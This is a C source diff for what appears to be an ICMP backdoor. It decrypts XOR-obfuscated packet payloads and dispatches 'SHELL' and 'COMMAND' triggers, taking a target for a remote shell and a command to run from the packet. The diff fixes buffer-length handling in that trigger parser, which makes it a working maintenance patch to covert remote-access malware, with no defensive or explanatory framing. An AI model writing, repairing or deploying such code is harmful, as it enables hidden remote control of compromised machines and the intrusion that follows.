@@ -6,9 +6,8 @@ void compare(int payloadLength, char* data)
 	{
 		if (strncmp(data, SHELL, 6) == 0)
 		{
-			/* char* rip = (char*)data + 6; */
-			char* rip = (char*)malloc(strlen(data)+6);
-			strncpy(rip, data+6, strlen(data)+6);
+			char* rip = (char*)malloc(payloadLength-6);
+			strncpy(rip, data+6, payloadLength-6);
 #ifdef DEBUG
 			printf("%s", data);
 #endif
@@ -17,8 +16,8 @@ void compare(int payloadLength, char* data)
 		}
 		else if (strncmp(data, COMMAND, 6) == 0)
 		{
-			char* cmd = (char*)malloc(strlen(data)+6);
-			strncpy(cmd, data+6, strlen(data)+6);
+			char* cmd = (char*)malloc(payloadLength-6);
+			strncpy(cmd, data+6, payloadLength-6);
 #ifdef DEBUG
 			printf("%s", cmd);
 #endif
@@ -69,7 +68,7 @@ void handleICMP(char* buffer, struct ip_hdr_s* ip_header)
 		char* data = (char*)(buffer + BUFFER_OFFSET_ICMP_DATA);
 		int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_ICMP;
 #ifndef DEBUG
-            XORCipher(data, XOR_KEY, payloadLength);
+        XORCipher(data, XOR_KEY, payloadLength);
 #endif
 		data[payloadLength - 1] = '\0';
 		compare(payloadLength, data);
